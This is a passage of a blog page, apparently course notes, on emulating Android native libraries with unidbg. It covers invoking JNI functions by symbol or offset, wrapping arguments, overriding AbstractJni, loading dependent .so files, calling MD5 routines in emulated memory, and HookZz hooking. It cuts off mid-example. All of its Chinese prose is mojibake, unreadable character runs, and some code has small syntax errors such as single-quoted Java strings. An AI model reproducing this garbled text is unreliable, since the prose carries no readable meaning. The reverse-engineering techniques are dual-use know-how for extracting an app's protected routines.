ä¸éœ€è¦è‡ªå·±åŒ…è£…å‚æ•°</span><br><span class="line">   (åƒè¿™ç§è°ƒç”¨å‡½æ•°çš„æ¥å£å‡½æ•° æ— è®ºè°ƒç”¨é™æ€è¿˜æ˜¯åŠ¨æ€éƒ½å¯ä»¥ç”¨Static)</span><br><span class="line"></span><br><span class="line">2. **é€šè¿‡ç¬¦å·å¯»æ‰¾å‡½æ•°åœ°å€çš„è¿‡ç¨‹**</span><br><span class="line"></span><br><span class="line">   é€šè¿‡ä¼ å…¥çš„ç¬¦å·åœ¨åŠ¨æ€æ³¨å†Œå‡½æ•°ä¸­å¯»æ‰¾å‡½æ•°åœ°å€ï¼ŒnativesMapå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™æŒ‰é™æ€æ³¨å†Œè§„åˆ™æ‹¼æ¥ç¬¦å·ï¼Œç„¶åå¯»æ‰¾å‡½æ•°åœ°å€ å‡½æ•°åå’Œå‡½æ•°ç­¾å</span><br><span class="line"></span><br><span class="line">3. å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒåŒ…è£…çš„è¿‡ç¨‹</span><br><span class="line"></span><br><span class="line"><span class="comment">### å½“è¿”å›å€¼å’Œå‚æ•°æœ‰å­—èŠ‚æ•°ç»„æ—¶</span></span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">byte[] callFunc()&#123;</span><br><span class="line">    byte[] data =<span class="built_in"> new </span>byte[16];</span><br><span class="line">        ByteArray<span class="built_in"> array </span>= TTEncryptUtils.callStaticJniMethodObject(emulator, <span class="string">&quot;ttEncrypt([BI)[B&quot;</span>,<span class="built_in"> new </span>ByteArray(vm, data), data.length); // æ‰§è¡ŒJniæ–¹æ³•</span><br><span class="line">       <span class="built_in"> return </span>array.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>ä½¿ç”¨Unidbgçš„API==ã€‹ByteArrayè¿›è¡ŒåŒ…è£… ä½¿ç”¨getValueæ–¹æ³•æ¥è·å¾—javaçš„ç±»å‹byte[]</p><p>æ‰“å°javaå­—èŠ‚æ•°ç»„ï¼šInspector.<em>inspect</em>(è¿”å›å€¼, æ ‡ç­¾);</p><p><strong>åœ¨æ–°ç‰ˆæœ¬å½“ä¸­å¯ä»¥ä¸ç”¨ä¸»åŠ¨åŒ…è£…byte[]ï¼ŒStringï¼Œé¡¹ç›®å·²ç»ç»™ç”¨æˆ·åŒ…è£…è¿‡äº†</strong></p><h3 id="å½“è¿”å›å€¼å’Œå‚æ•°æ˜¯intæ—¶">å½“è¿”å›å€¼å’Œå‚æ•°æ˜¯intæ—¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">retval</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodInt(emulator, <span class="string">&quot;add(III)I&quot;</span>, <span class="number">0x100</span>,<span class="number">0x200</span>,<span class="number">0x300</span>); <span class="comment">// æ‰§è¡ŒJniæ–¹æ³•</span></span><br><span class="line">      <span class="keyword">return</span> retval;</span><br></pre></td></tr></table></figure><p><strong>Integer.toHexString()</strong>ï¼šå˜ä¸ºåå…­è¿›åˆ¶å½¢å¼</p><h3 id="å½“è¿”å›å€¼å’Œå‚æ•°æ˜¯Stringæ—¶">å½“è¿”å›å€¼å’Œå‚æ•°æ˜¯Stringæ—¶</h3><p>å¯¹Stringè¿›è¡ŒåŒ…è£… new StringObject(vm,â€œxxxxâ€);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;xxx&quot;</span>)); <span class="comment">// æ‰§è¡ŒJniæ–¹æ³•</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Resultï¼š&quot;</span>+md5Result.getValue());</span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“unidbgæ¨¡æ‹Ÿæ‰§è¡ŒJNIå‡½æ•°æ—¶é‡åˆ°CallObjectMethodæ—¶ï¼Œä¼šæŠ¥é”™å› ä¸ºunidbgæ²¡æœ‰å®ç°è¿™ä¸ªJNIæ¥å£</p><p>æœ€ç®€å•çš„æ–¹å¼å¦‚ä¸‹ï¼š</p><p>åœ¨é€‚å½“ä½ç½®åŠ å…¥</p><p><code>vm.setJni(new AbstractJni()&#123;&#125;);</code></p><p>(CallObjectMethodæœ€ç»ˆä¹Ÿæ˜¯è°ƒç”¨CallObjectMethodV)</p><h3 id="å¤„ç†soè°ƒç”¨ç³»ç»Ÿjavaç±»">å¤„ç†soè°ƒç”¨ç³»ç»Ÿjavaç±»</h3><ol><li>unidbgå®ç°äº†å¤§éƒ¨åˆ†çš„JNIå‡½æ•°ï¼Œå¯¹äºæ²¡æœ‰å®ç°çš„éœ€è¦è‡ªå·±æ¥å®ç°</li><li>å·²ç»å®ç°çš„ ç±»ä¼¼CallObjectMethodVï¼Œéœ€è¦è‡ªå·±åˆ†æso åšæœ‰é’ˆå¯¹çš„è¦†å†™</li><li>é€šè¿‡vm.setjni(this)è¦†å†™çˆ¶ç±»AbstractJniæ–¹æ³•</li><li>å¦‚æœsoé€šè¿‡JNIè®¿é—®æ¯”è¾ƒå¤šçš„Javaç±» åè€…IDAåç¼–è¯‘çš„soé€»è¾‘ä¸æ˜¯å¾ˆæ¸…æ¥š æ¯”å¦‚å­˜åœ¨æ··æ·†ï¼Œè¿™æ—¶å¯ä»¥å€ŸåŠ©Jnitraceæ¥è¡¥</li></ol><p>å¯¹äºéœ€è¦è‡ªå·±åˆ†æsoï¼Œåšæœ‰é’ˆå¯¹æ€§çš„è¦†å†™ï¼ˆå¦‚callObjectMethodVï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vm.setJni(<span class="keyword">new</span> <span class="title class_">AbstractJni</span>() &#123;  <span class="comment">//é‡å†™æ¥å£</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;signature: &quot;</span> + signature); <span class="comment">//è¿”å›ç­¾å</span></span><br><span class="line">              <span class="keyword">if</span>(signature.equals(<span class="string">&quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;</span>)) &#123;<span class="comment">//å¦‚æœæ˜¯è¦æ‰¾çš„ç±»ä¸‹çš„æ–¹æ³•</span></span><br><span class="line">                  <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> (String) dvmObject.getValue(); <span class="comment">//è¿”å›å‚æ•°</span></span><br><span class="line">                  System.out.println(<span class="string">&quot;args: &quot;</span> + args);</span><br><span class="line">                  <span class="comment">//byte[] strBytes = args.getBytes();</span></span><br><span class="line">                  <span class="type">byte</span>[] strBytes = <span class="string">&quot;unidbg&quot;</span>.getBytes(); <span class="comment">//ä¿®æ”¹è¿”å›å€¼</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, strBytes);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>å¯¹äºä½¿ç”¨vm.setjni(this)è¦†å†™çˆ¶ç±»AbstractJniæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ³¨æ„ï¼šç±»è¦ç»§æ‰¿AbstractJni å‘ä¸Šè½¬å‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeHelper</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="comment">//æ­¤å¤„çœç•¥</span></span><br><span class="line">    vm = emulator.createDalvikVM(); <span class="comment">// åˆ›å»ºAndroidè™šæ‹Ÿæœº</span></span><br><span class="line">vm.setJni(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//åé¢çœç•¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç„¶ååœ¨åé¢éšæ„ä½ç½® </span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;signature: &quot;</span> + signature);</span><br><span class="line">        <span class="keyword">if</span>(signature.equals(<span class="string">&quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> (String) dvmObject.getValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;args: &quot;</span> + args);</span><br><span class="line">            <span class="comment">//byte[] strBytes = args.getBytes();</span></span><br><span class="line">            <span class="type">byte</span>[] strBytes = <span class="string">&quot;unidbg&quot;</span>.getBytes();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, strBytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤„ç†soè°ƒç”¨å…¶ä»–so">å¤„ç†soè°ƒç”¨å…¶ä»–so</h3><ul><li>å¦‚æœè¢«è°ƒç”¨çš„å‡½æ•°éœ€è¦å…ˆæ‰§è¡ŒJNI_OnLoadæˆ–è€…å…¶ä»–å‡½æ•° é‚£ä¹ˆå°±æŒ‰é¡ºåºè°ƒç”¨</li><li>å¦‚æœsoä¸­è°ƒç”¨äº†å…¶ä»–çš„so åªéœ€è¦æŒ‰é¡ºåºåŠ è½½æ‰€éœ€è¦çš„soå³å¯</li><li>dlopenä¼šè‡ªå·±å¤„ç† <a href="http://xn--unidbglibdl-g68q84a833bcqpvw7s.so">å› ä¸ºunidbgåŠ è½½äº†libdl.so</a></li><li>c/c++æ ‡å‡†åº“ä¹Ÿä¼šè‡ªå·±å¤„ç† <a href="http://xn--unidbglibc-xx2pw2a830b8oos50s.so">å› ä¸ºunidbgåŠ è½½äº†libc.so</a> <a href="http://libc++.so">libc++.so</a></li></ul><p>xjbï¼š21è¯¾æ—¶</p><p>æœ¬æ¬¡æ¡ˆä¾‹hookæ‰encodeå‡½æ•°ï¼Œä»–æ˜¯åŠ¨æ€æ³¨å†Œçš„ï¼Œæ‰€ä»¥unidbgå¼€å¯JNI_OnLoadå‡½æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯å‡ºé”™ã€‚</p><p>æŠ¥é”™Illegal JNI version:0xffffffff</p><p>è§‚å¯Ÿ.soæ–‡ä»¶ä¸­çš„JNI_OnLoadå‡½æ•°ï¼Œå‘ç°ä¸€ä¸ªbssFuncå‡½æ•°ï¼Œè·Ÿè¿›å‘ç°ä»–æ˜¯ä¸€ä¸ªå¯¼å…¥å‡½æ•°(<a href="http://xn--9orq4j6toqwo1nn.so">æ¥è‡ªå¦å¤–çš„.so</a>)</p><p>é‚£æˆ‘ä»¬å°±è¦åœ¨è¦hookçš„.soæ–‡ä»¶åŠ è½½å‰åŠ è½½å¯¼å…¥å‡½æ•°æ‰€åœ¨çš„.soæ–‡ä»¶ã€‚</p><p><code>DalvikModule dm = vm.loadLibrary(new File(&quot;unidbg-android/src/test/java/åŒ…è·¯å¾„/.soæ–‡ä»¶å&quot;), false);</code></p><p>å½“ä½¿ç”¨dlopenæ—¶å€™ï¼Œunidbgä¼šè‡ªåŠ¨å¤„ç†(<a href="http://xn--unidbglibdl-g68qn31g9e4c3uxa6p7agw5g.so">å› ä¸ºunidbgæºç é‡Œæœ‰libdl.so</a>)</p><ul><li>ä¸€äº›æ³¨æ„äº‹é¡¹</li></ul><ol><li>å¦‚æœhookçš„æ–¹æ³•ä¸åœ¨åŒä¸€ä¸ªclassä¸‹ï¼Œè¦ä½¿ç”¨å¤šä¸ªâ€™vm.resolveClassâ€™æ¥åŠ è½½ç±»</li></ol><p>æˆ–è€… ç›´æ¥ä½¿ç”¨module.callFunction()ã€‚</p><p>2.å¦‚æœå‡½æ•°åœ¨å¤šä¸ªsoä¸­ï¼Œå°±éœ€è¦åŠ è½½å¤šä¸ªso</p><p>3.åœ¨åŠ è½½æˆ‘ä»¬çš„soä¹‹å‰ï¼Œunidbgè¿˜åŠ è½½äº†ä¸€äº›ç³»ç»Ÿsoï¼Œå¯ä»¥ä½¿ç”¨æ ‡å‡†Cå‡½æ•°ï¼Œdlopenå‡½æ•°ç­‰</p><p>4.çº¯soçš„ä»£ç æœ¬æ¥å°±å¯ä»¥æ‰§è¡Œçš„</p><p>5.JNIå‡½æ•°ä¹Ÿå®ç°äº†ä¸€äº›ï¼Œæœ‰ä¸€éƒ¨åˆ†JNIå‡½æ•°éœ€è¦æ‰‹åŠ¨æ¥ç®¡</p><p>6.å°†unidbgæ—¥å¿—å…¬å¼€ï¼Œè§‚å¯Ÿä¿¡æ¯ã€‚</p><p>â€‹      src/test/resources/log4j.propertiesä¸­çš„INFOå…¨æ”¹ä¸ºDEBUG</p><h3 id="é€šè¿‡ç¬¦å·è°ƒç”¨å‡½æ•°1">é€šè¿‡ç¬¦å·è°ƒç”¨å‡½æ•°1</h3><p>xjb:23è¯¾æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//è·å–åˆ°symbolæœ€å¥½å…ˆåˆ¤æ–­æ˜¯å¦null</span></span><br><span class="line">    <span class="type">Symbol</span> <span class="variable">symbol</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&#x27;æ±‡ç¼–ä¸­çš„å‡½æ•°ç¬¦å·å&#x27;</span>);</span><br><span class="line">    <span class="comment">//è¿”å›Number[]ï¼Œå…¶ä¸­ç¬¬0ä¸ªæˆå‘˜æ˜¯è¿”å›å€¼</span></span><br><span class="line">    Number[] numbers = symbol.call(emulator,vm.getJNIEnv(),vm.addLocalObject(NativeHelper)ï¼Œ<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>);<span class="comment">//å†™å‚æ•°çš„æ—¶å€™çœ‹idaä¸­å‡½æ•°å‚æ•°ï¼Œè¦å†™JniEnv</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">retval</span> <span class="operator">=</span> numbers[<span class="number">0</span>].intValue(); <span class="comment">//Numberä¸­ç»“æœä¹Ÿæ˜¯åŒ…è£…è¿‡çš„</span></span><br><span class="line">    System.out.println(retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¾—åˆ°Javaçš„intæ•°æ®åï¼Œæ ¹æ®è¿™ä¸ªæ•°æ®å»å†…å­˜ä¸­æå¯¹è±¡æˆ–è€…æ•°æ®">å¾—åˆ°Javaçš„intæ•°æ®åï¼Œæ ¹æ®è¿™ä¸ªæ•°æ®å»å†…å­˜ä¸­æå¯¹è±¡æˆ–è€…æ•°æ®</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//è·å–åˆ°symbolæœ€å¥½å…ˆåˆ¤æ–­æ˜¯å¦null</span></span><br><span class="line">    <span class="type">Symbol</span> <span class="variable">symbol</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&#x27;_Z7_strcatP7_JNIEnvP7_jclass&#x27;</span>);</span><br><span class="line">    <span class="comment">//è¿”å›Number[]ï¼Œå…¶ä¸­ç¬¬0ä¸ªæˆå‘˜æ˜¯è¿”å›å€¼</span></span><br><span class="line">    Number[] numbers = symbol.call(emulator,vm.getJNIEnv(),vm.addLocalObject(NativeHelper));<span class="comment">//å†™å‚æ•°çš„æ—¶å€™çœ‹idaä¸­å‡½æ•°å‚æ•°ï¼Œè¦å†™JniEnv</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> numbers[<span class="number">0</span>].intValue();</span><br><span class="line">    System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¿”å›çš„æ˜¯javaå¯¹è±¡</p><p>vm.getObject(retval)  ==&gt;  ç›¸å½“äºvm.addLocalObjectåè¿‡ç¨‹</p><p>æ¯”å¦‚è¿”å›æ˜¯åœ°å€</p><p>emulator.getMemory().pointer(retval).getByteArray(â€¦ , â€¦);</p><p>æ¯”å¦‚è¿”å›çš„æ˜¯é•¿åº¦</p><p>emulator.getMemory().getByteArray(â€¦ , retval);</p><h3 id="é€šè¿‡ç¬¦å·è°ƒç”¨å‡½æ•°2">é€šè¿‡ç¬¦å·è°ƒç”¨å‡½æ•°2</h3><p>xjbç¬¬24è¯¾æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">Number</span> <span class="variable">numbers</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="string">&quot;_Z7_strcatP7_JNIEnvP7_jclass&quot;</span>, vm.getJNIEnv(), vm.addLocalObject(NativeHelper));</span><br><span class="line">       <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> numbers.intValue();</span><br><span class="line">       System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ¨¡æ‹ŸcallStaticJniMethodObject()çš„åŠŸèƒ½ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.æ‰¾åˆ°ç¬¦å·å¯¹åº”çš„åœ°å€</span><br><span class="line"><span class="number">2</span>.åŒ…è£…ä¼ å…¥å‚æ•°</span><br><span class="line"><span class="number">3</span>.Javaç±»å‹çš„ä¼ é€’</span><br><span class="line"><span class="number">3.1</span>JNIEnv*çš„è·å–</span><br><span class="line">   vm<span class="selector-class">.getJNIEnv</span>()</span><br><span class="line"><span class="number">3.2</span> jclass/jobjectçš„æ„å»º</span><br><span class="line">   DvmClass xxx = vm<span class="selector-class">.resolveClass</span>(...)</span><br><span class="line">   DvmObject xxxx = xxx<span class="selector-class">.newObject</span>(null)</span><br><span class="line">   vm<span class="selector-class">.addLocalObject</span>(xxx) <span class="comment">//javaç±»æˆ–è€…å¯¹è±¡ä»¥å¼•ç”¨çš„æ–¹å¼ä¼ å…¥</span></span><br><span class="line">   </span><br><span class="line">DvmObject obj = xxx<span class="selector-class">.newObject</span>(null)</span><br><span class="line">System<span class="selector-class">.out</span><span class="selector-class">.println</span>(vm<span class="selector-class">.addLocalObject</span>(obj)) &lt;==&gt; System<span class="selector-class">.out</span><span class="selector-class">.println</span>(obj<span class="selector-class">.hashCode</span>())</span><br></pre></td></tr></table></figure><h3 id="é€šè¿‡åç§»è°ƒç”¨å‡½æ•°">é€šè¿‡åç§»è°ƒç”¨å‡½æ•°</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="number">0x1B4C</span>,vm.getJNIEnv(), vm.addLocalObject(NativeHelper));</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> number.intValue();</span><br><span class="line">        System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>2.å®ç°md5</strong></p><p>Cè¯­è¨€ç±»å‹çš„ä¼ é€’ï¼Œé€šè¿‡å†…å­˜å¤„ç†</p><ul><li>memory.malloc(16).getPointer()</li><li>memoryä¸‹å±å¾ˆå¤šæ“ä½œå†…å­˜çš„æ–¹æ³•</li><li>pointerä¸‹å±å¾ˆå¤šæ“ä½œå†…å­˜çš„æ–¹æ³•</li><li>MD5_CTXä¸éœ€è¦ç‰¹åˆ«çš„å®šä¹‰ åªéœ€ç»™ä»–è¶³å¤Ÿçš„å†…å­˜å³å¯ ç»“æ„ä½“å®é™…ä¸Šå°±æ˜¯ä¸€æ®µè¿ç»­çš„å†…å­˜ä¸”ç»“æ„ä½“ä¸­å­˜åœ¨å†…å­˜å¯¹é½</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    unsigned <span class="type">int</span> count[<span class="number">2</span>];  <span class="comment">//é•¿åº¦</span></span><br><span class="line">    unsigned <span class="type">int</span> state[<span class="number">4</span>];  <span class="comment">//åˆå§‹åŒ–é­”æ•°</span></span><br><span class="line">    unsigned <span class="type">char</span> buffer[<span class="number">64</span>]; <span class="comment">//æ˜æ–‡æ•°æ®</span></span><br><span class="line">&#125;MD5_CTX; </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//MD5Init è°ƒç”¨MD5Initæ¥å®Œæˆå†…å­˜å¼€è¾Ÿå³å¡«å……æ•°æ®</span></span><br><span class="line">    <span class="comment">//ç”³è¯·ç©ºé—´ falseä¸éœ€è¦æŒ‰é¡µåˆ†é…</span></span><br><span class="line">    <span class="type">UnidbgPointer</span> <span class="variable">MD5Ctx</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x2230</span>,MD5Ctx); <span class="comment">//è°ƒç”¨å‡½æ•° </span></span><br><span class="line">        <span class="comment">//md5Update</span></span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">plainText</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="string">&quot;adgbuawhi&quot;</span>.getBytes();</span><br><span class="line">        plainText.write(buffer);</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x22A0</span>,MD5Ctx,plainText,buffer.length);</span><br><span class="line">        <span class="comment">//MD5Final</span></span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">cipherText</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x3A78</span>,MD5Ctx,cipherText);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = cipherText.getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        Inspector.inspect(byteArray,<span class="string">&quot;MD5Result&quot;</span>);</span><br><span class="line">        <span class="comment">//Inspector.inspect(æ•°æ®ï¼Œlabel);</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h3 id="unidbgä¸­çš„Hook">unidbgä¸­çš„Hook</h3><ul><li>unidbgæ”¯æŒdobbyï¼Œhookzzï¼Œwhaleï¼Œxhook</li><li>hookzzæ˜¯dobbyçš„å‰èº«ï¼Œhookzzå¯¹32ä½æ”¯æŒè¾ƒå¥½ï¼Œdobbyå¯¹64ä½æ”¯æŒè¾ƒå¥½</li><li>unidbgæ”¯æŒUnicornè‡ªå¸¦çš„å„ç§Hook(æŒ‡ä»¤çº§hookï¼Œå—çº§hookï¼Œå†…å­˜è¯»å†™hookï¼Œå¼‚å¸¸hook)ä»¥åŠunidbgå°è£…åçš„console debuger</li><li>åŸç”Ÿunicorn hookä¸å®¹æ˜“è¢«æ£€æµ‹ï¼Œconsole debugerå¯ä¸‹å¤šä¸ªæ–­ç‚¹ ç”¨äºå¿«é€ŸéªŒè¯</li><li>RegisterContextå’ŒArm64RegisterContextï¼ŒArm32RegisterContextç”¨æ³•ä¸€æ ·ï¼Œä½†æ˜¯Arm32/64RegisterContextå¯ä»¥ä½¿ç”¨å¯„å­˜å™¨</li><li>unidbgæ²¡æ³•å¤„ç†å­çº¿ç¨‹ä¸­çš„æ“ä½œ Hookç›¸åº”ä½ç½®ï¼ŒæŠŠå­çº¿ç¨‹è®¡ç®—ç»“æœèµ‹å€¼ç»™å¯„å­˜å™¨</li></ul><h3 id="Hookzzçš„ç®€å•ä½¿">Hookzzçš„ç®€å•ä½¿</h3><p>Hook MD5Update</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// åŠ è½½HookZzï¼Œæ”¯æŒinline hookï¼Œæ–‡æ¡£çœ‹https://github.com/jmpews/HookZz</span></span><br><span class="line">        hookZz.enable_arm_arm64_b_branch(); <span class="comment">// æµ‹è¯•enable_arm_arm64_b_branchï¼Œå¯æœ‰å¯æ— </span></span><br><span class="line">        hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;RegisterContext&gt;() &#123; <span class="comment">// inline wrapå¯¼å‡ºå‡½æ•°</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                md5_ctx = ctx.getPointerArg(<span class="number">0</span>);    <span class="comment">//å–æŒ‡é’ˆå‹å‚æ•°</span></span><br><span class="line">                <span class="type">Pointer</span> <span class="variable">plainText</span> <span class="operator">=</span> ctx.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">2</span>);     <span class="comment">//å–intå‹å‚æ•°</span></span><br><span class="line">                Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">64</span>), <span class="string">&quot;preCall 